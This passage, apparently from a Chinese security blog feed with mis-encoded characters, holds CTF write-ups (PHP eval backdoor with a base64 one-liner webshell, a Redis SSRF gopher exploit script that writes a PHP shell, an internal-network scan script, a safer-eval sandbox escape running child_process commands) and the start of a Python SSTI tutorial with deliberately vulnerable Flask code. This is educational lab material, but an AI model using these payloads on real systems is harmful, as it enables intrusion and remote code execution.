<p>è¾“å…¥ps -efå‘ç°auto.shæ˜¯rootæƒé™æ‰§è¡Œçš„ã€‚</p>
<p>ç„¶ååœ¨/var/mail/makeflaghint.pyä¿®æ”¹ä¸€ä¸‹ä»£ç ï¼ŒåŠ å…¥ä¸¤è¡Œå†…å®¹è¯»å–/root/flagåˆ°/flag.hint</p>
<img src="http://img.kawhi.xyz/image-20200526220613995.png" style="high:80%;width:80%;" />

<p>ç„¶ååœ¨flag.hinté‡Œé¢æˆåŠŸè¯»å–flagã€‚</p>
<h4 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a><strong>CheckIN</strong></h4><p>æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line">&#123;</span><br><span class="line">        public $code = null;</span><br><span class="line">        public $decode = null;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;];</span><br><span class="line">                $this-&gt;decode = @base64_decode( $this-&gt;code );</span><br><span class="line"><span class="meta">                @Eval($this-&gt;decode);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function x()</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">new ClassName(); </span><br></pre></td></tr></table></figure>

<p>phpinfo();</p>
<p>base64åŠ å¯†ä¸º cGhwaW5mbygpOw== </p>
<p>å›æ˜¾æˆåŠŸï¼Œåˆ©ç”¨ä¸€å¥è¯è¿æ¥ </p>
<p>eval($_POST[cmd]);</p>
<p>base64åŠ å¯†å¾—ZXZhbCgkX1BPU1RbY21kXSk7</p>
<p>åœ¨æ ¹ç›®å½•çœ‹åˆ°ä¸€ä¸ªflagï¼Œä½†æ˜¯æ²¡æœ‰æƒé™æŸ¥çœ‹ï¼Œè¿˜æœ‰ä¸€ä¸ªreadflagæ–‡ä»¶ã€‚</p>
<p>ä½†æ˜¯å‘ç°èšå‰‘ç»ˆç«¯å¹¶ä¸èƒ½ç”¨ï¼Œå›åˆ°phpinfo()å‘ç°å¾ˆå¤šæ–¹æ³•è¢«ç¦ç”¨ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200526225116128.png" style="high:80%;width:80%;" />

<p>è¿‡æ»¤äº†å¾ˆå¤šfunctionï¼Œæƒ³åˆ°ç»•è¿‡disable_functionsï¼Œä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ä½¿å…¶æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œexpåœ°å€ï¼š<a class="foo" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank">ä¼ é€é—¨</a></p>
<p>åœ¨è¿™é‡Œç¨å¾®æ”¹ä¸€ä¸‹ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200526225159436.png" style="high:80%;width:80%;" />

<p>ç„¶ååœ¨é¡µé¢å°±å¯ä»¥å¾—åˆ°flagã€‚</p>
<img src="http://img.kawhi.xyz/image-20200526225043564.png" style="high:80%;width:80%;" />

<h4 id="cveç‰ˆç­¾åˆ°"><a href="#cveç‰ˆç­¾åˆ°" class="headerlink" title="cveç‰ˆç­¾åˆ°"></a><strong>cveç‰ˆç­¾åˆ°</strong></h4><p>é€šè¿‡%00æˆªæ–­å¯ä»¥è®©<code>get_headers()</code>è¯·æ±‚åˆ°é”™è¯¯çš„ä¸»æœºï¼Œäºæ˜¯è¯·æ±‚åˆ°æœ¬åœ°ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200526231215560.png" style="high:80%;width:80%;" />

<p>å†æ ¹æ®æç¤ºæŠŠåç¼€æ”¹ä¸º123</p>
<img src="http://img.kawhi.xyz/image-20200526231327900.png" style="high:80%;width:80%;" />

<p>å³å¯å¾—åˆ°flagã€‚</p>
<h4 id="EZä¸‰å‰‘å®¢-EzWeb"><a href="#EZä¸‰å‰‘å®¢-EzWeb" class="headerlink" title="EZä¸‰å‰‘å®¢-EzWeb"></a><strong>EZä¸‰å‰‘å®¢-EzWeb</strong></h4><p>è®¿é—®?secretå¾—åˆ°æœ¬æœºip</p>
<img src="http://img.kawhi.xyz/image-20200527114207278.png" style="high:80%;width:80%;" />

<p>å†™ä¸ªè„šæœ¬æ¢æµ‹å†…ç½‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;173.17.51.&#123;&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ac0d31a7-5126-4f26-a7ec-b38aceea896a.node3.buuoj.cn&#x27;</span></span><br><span class="line">temp = <span class="string">&quot;&#123;0&#125;/index.php?url=&#123;1&#125;&amp;&amp;submit=æäº¤&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    u = temp.format(url, ip.format(i))</span><br><span class="line">    resp = requests.get(u)</span><br><span class="line">    <span class="keyword">if</span> len(resp.text) != <span class="number">421</span>:</span><br><span class="line">    	print(i)</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºç»“æœ4 5 6 7 10 11</p>
<p>ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œ11çš„æ—¶å€™ç»™å‡ºäº†æç¤ºã€‚</p>
<p>ç„¶åç”¨burpçˆ†ç ´ç«¯å£</p>
<img src="http://img.kawhi.xyz/image-20200527114920600.png" style="high:80%;width:80%;" />

<p>payloadsé€‰numbersçˆ†ç ´1åˆ°65535ç«¯å£ï¼Œçº¿ç¨‹é€‰1ã€‚</p>
<p>çˆ†ç ´å‡ºç»“æœ6374ã€‚</p>
<p>å› ä¸ºè¾“å…¥urlè¿™é‡Œåªé™åˆ¶äº†<code>file://</code>ï¼Œæ²¡æœ‰banæ‰<code>gopher://</code>ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯Redis SSRF getshellã€‚</p>
<p>ç›´æ¥ç”¨expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.17.51.11&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	print(payload)</span><br></pre></td></tr></table></figure>

<p>payloadä¸ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gopher://<span class="number">173.17</span><span class="number">.51</span><span class="number">.11</span>:<span class="number">6379</span>/_%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">248</span>%<span class="number">0</span>D%<span class="number">0</span>Aflushall%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A3%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">241</span>%<span class="number">0</span>D%<span class="number">0</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2432</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system%<span class="number">28</span>%<span class="number">22</span>cat%<span class="number">20</span>/flag%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Adir%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2413</span>%<span class="number">0</span>D%<span class="number">0</span>A/var/www/html%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2410</span>%<span class="number">0</span>D%<span class="number">0</span>Adbfilename%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">249</span>%<span class="number">0</span>D%<span class="number">0</span>Ashell.php%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">244</span>%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æ‰“è¿›å»ã€‚</p>
<p>åœ¨æ ¹ç›®å½•ä¸‹ç”Ÿæˆä¸ªæ–‡ä»¶shell.phpï¼Œè®¿é—®å³å¯å¾—åˆ°flagã€‚</p>
<h4 id="EZä¸‰å‰‘å®¢-EzNode"><a href="#EZä¸‰å‰‘å®¢-EzNode" class="headerlink" title="EZä¸‰å‰‘å®¢-EzNode"></a><strong>EZä¸‰å‰‘å®¢-EzNode</strong></h4><p>æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const bodyParser = require(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const saferEval = require(<span class="string">&#x27;safer-eval&#x27;</span>); // <span class="number">2019.7</span>/WORKER1 æ‰¾åˆ°ä¸€ä¸ªå¾ˆæ£’çš„åº“</span><br><span class="line"></span><br><span class="line">const fs = require(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; extended: false &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">// <span class="number">2020.1</span>/WORKER2 è€æ¿è¯´ä¸ºäº†åæœŸæ–¹ä¾¿ä¼˜åŒ–</span><br><span class="line">app.use((req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    let delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    console.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (Number.isInteger(parseInt(req.query.delay))) &#123;</span><br><span class="line">      delay = Math.max(delay, parseInt(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    const t = setTimeout(() =&gt; next(), delay);</span><br><span class="line">    // <span class="number">2020.1</span>/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      console.log(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/eval&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  let response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(String(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// <span class="number">2019.10</span>/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI</span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// <span class="number">2019.12</span>/WORKER3 ä¸ºäº†æ–¹ä¾¿æˆ‘è‡ªå·±æŸ¥çœ‹ç‰ˆæœ¬ï¼ŒåŠ ä¸Šè¿™ä¸ªæ¥å£</span><br><span class="line">app.get(<span class="string">&#x27;/version&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/json;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./package.json&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>åˆ†æï¼š</p>
<ul>
<li><strong>setTimeout</strong> </li>
</ul>
<p>æ•´æ•°æº¢å‡ºï¼ŒInfinityæˆ–è€… å¤§äº 2147483647</p>
<p>ç„¶ågetä¼ å‚å³å¯ã€‚</p>
<ul>
<li><strong>safeeval</strong></li>
</ul>
<p>RCEåœ°å€ï¼š<a class="foo" href="https://github.com/commenthol/safer-eval/issues/10" target="_blank">ä¼ é€é—¨</a></p>
<p>payload(postæäº¤)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e=setInterval.constructor(<span class="string">&#x27;return process&#x27;</span>)().mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;cat /flag&#x27;</span>).toString();</span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200601151723022.png" style="high:80%;width:80%;" />

<h4 id="PokeÌmon"><a href="#PokeÌmon" class="headerlink" title="PokeÌmon"></a><strong>PokeÌmon</strong></h4><p>ä¸‹è½½å¾—åˆ°ä¸€ä¸ªgbaæ–‡ä»¶ï¼Œç”¨<code>VisualBoyAdvance</code>æ‰“å¼€ï¼Œç©æ¸¸æˆå³å¯å¾—åˆ°flagã€‚</p>
<h4 id="code-obfuscation"><a href="#code-obfuscation" class="headerlink" title="code obfuscation"></a><strong>code obfuscation</strong></h4><p>å¾—åˆ°ä¸€å¼ æ®‹ç¼ºçš„äºŒç»´ç å›¾ç‰‡</p>
<p>ç„¶ååœ¨è¿™ä¸ªç½‘ç«™ä¸Šé¢ä¿®è¡¥ï¼š<a class="foo" href="https://merricx.github.io/qrazybox/" target="_blank">ä¼ é€é—¨</a></p>
<p>æˆ–è€…ä½¿ç”¨psä¿®å¤ä¹Ÿè¡Œ</p>
<img src="http://img.kawhi.xyz/image-20200601172717498.png" style="high:50%;width:50%;" />

<p>æ‰«äºŒç»´ç å¾—gkctfï¼Œå†base58è§£å¯†å¾—åˆ°å‹ç¼©åŒ…å¯†ç CfjxaPFã€‚</p>
<h4 id="Harley-Quinn"><a href="#Harley-Quinn" class="headerlink" title="Harley Quinn"></a><strong>Harley Quinn</strong></h4><p>å¾—åˆ°ä¸€æ®µéŸ³é¢‘ï¼Œæœ€åé¢æœ‰æ‹¨å·éŸ³ï¼Œå‰ªåˆ‡ä¹‹åä¸¢åˆ°dtmfé‡Œé¢ã€‚</p>
<p>è§£å¾—#222833344477773338866# æ ¹æ®hintä¹é”®è¾“å‡ºctfisfunã€‚</p>
<p>ä¸‹è½½hintæ‰€è¯´çš„è½¯ä»¶, FreeFileCamouflageã€‚</p>
<img src="http://img.kawhi.xyz/image-20200601182225212.png" style="high:80%;width:80%;" />

<p>è¾“å…¥å¯†é’¥å’Œå›¾ç‰‡åœ°å€å¾—åˆ°flagã€‚</p>
<h4 id="Sail-a-boat-down-the-river"><a href="#Sail-a-boat-down-the-river" class="headerlink" title="Sail a boat down the river"></a><strong>Sail a boat down the river</strong></h4><p>ä¸‹è½½å¾—ä¸€ä¸ªflag.mp4æœ‰ä¸€å¸§æ˜¯äºŒç»´ç ï¼Œç„¶åæ‰«æå¾—åˆ°ä¸€ä¸ªç½‘ç›˜é“¾æ¥ï¼Œä½†æ˜¯æ²¡æœ‰æå–ç ï¼Œæ ¹æ®è§†é¢‘é‡Œçš„æ‘„åƒå¤´é—ªå…‰é•¿çŸ­è½¬æ¢æˆ<code>æ‘©æ–¯å¯†ç </code>ã€‚è§£ç å¾—<code>yw8g</code>ã€‚</p>
<p>å¾—åˆ°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">8</span> <span class="number">1</span> <span class="number">7</span> <span class="number">4</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">3</span> <span class="number">0</span> <span class="number">2</span> <span class="number">0</span> <span class="number">6</span> <span class="number">8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">4</span> <span class="number">0</span> <span class="number">6</span> <span class="number">5</span> <span class="number">0</span> <span class="number">0</span> <span class="number">8</span> <span class="number">2</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5</span> <span class="number">6</span></span><br><span class="line"><span class="number">7</span> <span class="number">0</span> <span class="number">4</span> <span class="number">3</span> <span class="number">0</span> <span class="number">9</span> <span class="number">2</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">5</span> <span class="number">9</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">1</span> <span class="number">0</span> <span class="number">8</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">8</span> <span class="number">0</span> <span class="number">9</span> <span class="number">0</span> <span class="number">2</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span> <span class="number">7</span> <span class="number">4</span> <span class="number">6</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">å¯†æ–‡:</span><br><span class="line">efb851bdc71d72b9ff668bddd30fd6bd</span><br><span class="line">å¯†é’¥:</span><br><span class="line">ç¬¬ä¸€åˆ—ä¹å®«æ ¼ä»å·¦åˆ°å³ä»ä¸Šåˆ°ä¸‹</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªç½‘ç«™å¯ä»¥è‡ªåŠ¨æ±‚è§£æ•°ç‹¬ï¼š<a class="foo" href="http://www.llang.net/sudoku/calsudoku.html" target="_blank">ä¼ é€é—¨</a></p>
<p>å¾—åˆ°å¯†é’¥<code>52693795149137</code>ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200601185426514.png" style="high:80%;width:80%;" />

<p>ç„¶åæ±‚å¾—å‹ç¼©åŒ…å¯†ç <code>GG0kc.tf</code>ï¼Œè§£å‹å¾—åˆ°<code>é€†å…‰ vocal.ovex</code>æ–‡ä»¶ã€‚ä½¿ç”¨<code>Overture 5</code>æ‰“è°±è½¯ä»¶æ‰“å¼€ï¼Œåœ¨æ­Œè¯é‡Œçœ‹åˆ°flagã€‚</p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>Python SSITå­¦ä¹ </title>
    <url>/2020/08/07/Python%20SSIT%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>å­¦ä¹ ä¸€æ³¢æ¨¡æ¿æ³¨å…¥ï¼Œå‚è€ƒï¼š</p>
<p><a class="foo" target="_blank" href="https://xz.aliyun.com/t/6885#toc-0">Pythonæ¨¡æ¿æ³¨å…¥(SSTI)æ·±å…¥å­¦ä¹ </a></p>
<h1 id="ä»€ä¹ˆæ˜¯SSIT"><a href="#ä»€ä¹ˆæ˜¯SSIT" class="headerlink" title="ä»€ä¹ˆæ˜¯SSIT"></a><strong>ä»€ä¹ˆæ˜¯SSIT</strong></h1><blockquote>


ä¸¾ä¸€ä¸ªä¾‹å­

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;flag&#123;SSTI_123456&#125;&quot;</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">&#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (request.args.get(<span class="string">&#x27;404_url&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œç›´æ¥å°†ç”¨æˆ·å¯æ§å‚æ•°`request.args.get('404_url')`åœ¨æ¨¡æ¿ä¸­ç›´æ¥æ¸²æŸ“å¹¶ä¼ å›é¡µé¢ä¸­ï¼Œè¿™ç§ä¸æ­£ç¡®çš„æ¸²æŸ“æ–¹æ³•ä¼šäº§ç”Ÿæ¨¡æ¿æ³¨å…¥(SSTI)ã€‚

<img src="http://img.kawhi.xyz/image-20200807151918090.png" style="high:80%;width:80%;" />

å¯ä»¥çœ‹åˆ°ï¼Œé¡µé¢ç›´æ¥è¿”å›äº†81è€Œä¸æ˜¯{{9*9}}

> 
</blockquote>
<h1 id="å¸¸è§çš„é­”æœ¯æ–¹æ³•"><a href="#å¸¸è§çš„é­”æœ¯æ–¹æ³•" class="headerlink" title="å¸¸è§çš„é­”æœ¯æ–¹æ³•"></a><strong>å¸¸è§çš„é­”æœ¯æ–¹æ³•</strong></h1><ul>
<li><code>__class__</code></li>
</ul>
<p>ç”¨äºè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">o = class1()</span><br><span class="line"></span><br><span class="line">print(o.__class__)</span><br><span class="line"><span class="comment">#&lt;class &#x27;__main__.class1&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__bases__</code></li>
</ul>
<p>ä»¥å…ƒç»„çš„å½¢å¼è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç±»ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class2</span>(<span class="params">class1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(class2.__bases__)</span><br><span class="line"><span class="comment">#(&lt;class &#x27;__main__.class1&#x27;&gt;,)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__base__</code></li>
</ul>
<p>ä»¥å­—ç¬¦ä¸²è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç±»ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class2</span>(<span class="params">class1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(class2.__base__)</span><br><span class="line"><span class="comment">#&lt;class &#x27;__main__.class1&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
